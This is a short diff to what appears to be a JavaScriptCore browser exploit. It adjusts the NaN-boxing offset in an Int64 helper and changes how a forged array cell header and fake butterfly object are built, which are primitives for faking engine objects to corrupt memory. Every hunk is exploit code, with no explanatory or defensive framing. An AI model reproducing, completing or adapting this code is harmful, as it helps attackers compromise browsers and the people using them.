@@ -129,10 +129,10 @@ function Int64(v) {
         if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
             throw new RangeError("Integer can not be represented by a JSValue");
 
-        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
-        this.assignSub(this, 0x1000000000000);
+        // For NaN-boxing, JSC adds 2^49 to a double value's bit pattern.
+        this.assignSub(this, 0x2000000000000);
         var res = Struct.unpack(Struct.float64, bytes);
-        this.assignAdd(this, 0x1000000000000);
+        this.assignAdd(this, 0x2000000000000);
 
         return res;
     };
@@ -344,7 +344,7 @@ function iv(x){
             return Sub(d,kBoxedDoubleOffset);
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = new Int64("0x0108230700000000");
+          let doubleArrayCellHeader = new Int64("0x0108230700000000").asJSValue();
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function f2dec(floatpoint) {
@@ -416,7 +416,7 @@ function iv(x){
             }
 
             let obj = {
-              jsCellHeader: dec2float(unboxDouble(doubleArrayCellHeader)),
+              jsCellHeader: dec2f(unboxDouble(doubleArrayCellHeader)),
               fakeButterfly: a0
             };
 
